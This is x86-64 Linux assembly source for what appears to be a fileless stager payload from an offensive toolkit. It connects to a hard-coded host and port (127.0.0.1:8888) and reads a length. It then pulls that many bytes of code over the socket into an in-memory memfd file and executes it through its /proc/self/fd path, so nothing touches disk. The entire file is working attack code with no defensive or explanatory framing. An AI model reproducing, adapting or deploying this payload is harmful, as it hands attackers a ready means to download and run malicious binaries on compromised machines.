; Authors:
; Ivan Nikolsky (https://github.com/enty8080)
; Tomas Globis (https://github.com/)

section .text
global _start

_start:
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	mov RAX, 0x29
	cdq
	mov RDI, 2
	mov RSI, 1
	syscall

	; connect(sockfd, {sa_family=AF_INET, sin_port=htons(8888), sin_addr=inet_addr("127.0.0.1")}, 16)
	xchg RDI, RAX
	mov RCX, 0x100007fb8220002
	push RCX
	mov RSI, RSP
	mov RDX, 0x10
	mov RAX, 0x2a
	syscall

	; read(sockfd, "", 4)
	mov RDX, 8
	push 0x0
	lea RSI, [RSP]
	xor RAX, RAX
	syscall

	pop R12       ; r12 = size
	mov R13, RDI  ; r13 = sockfd

	; memfd_create("", 0)
	xor rax, rax
	push rax
	push rsp
	sub rsp, 8
	mov rdi, rsp
	push 0x13f
	pop rax
	xor rsi, rsi
	syscall

	; r14 = fd
	mov R14, RAX

	; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
	mov RAX, 9
	xor RDI, RDI
	mov RSI, R12
	mov RDX, 7
	xor R9, R9
	mov R10, 0x22
	syscall

    ; r15 = address
    mov R15, RAX

    ; read(sockfd, "", size)
	xor RAX, RAX
	mov RDI, R13
	mov RSI, R15
	mov RDX, R12
	syscall

    ; write(fd, "", size)
    mov RAX, 1
    mov RDI, R14
    mov RDX, R12
    syscall


    ; === CONCAT INT TO STR (https://gist.github.com/TomasGlgg/c7c70acdd391fde30c221201b2cf7df8)

    add RSP, 16
	mov qword [RSP], 0x6f72702f
	mov qword [RSP+4], 0x65732f63
	mov qword [RSP+8], 0x662f666c
	mov qword [RSP+12], 0x002f64

	mov RAX, R14      ; number
	lea RBX, [RSP+14] ; buf

	mov RCX, 10    ; divisor
	xor RDI, RDI   ; number length

	mov RSI, RAX   ; backup number
number_len_loop:
	xor RDX, RDX   ; reset to zero RDX
	div RCX
	inc RDI
	test RAX, RAX
	jnz number_len_loop

	mov RAX, RSI   ; back number
	dec RDI        ; is offset

convert_loop:
	xor DX, DX     ; reset to zero RDX
	div RCX        ; RAX:RCX
	add DX, 48     ; int to symbol
	or [RBX+RDI], DX ; write symbol
	dec RDI        ; next symbol

	test RAX, RAX
	jnz convert_loop


    ; execve(fd, [], [])
    lea RDI, [RSP]
    mov RAX, 0x3b
    cdq
    push rdx
    push rdi
    mov rsi, rsp
    syscall

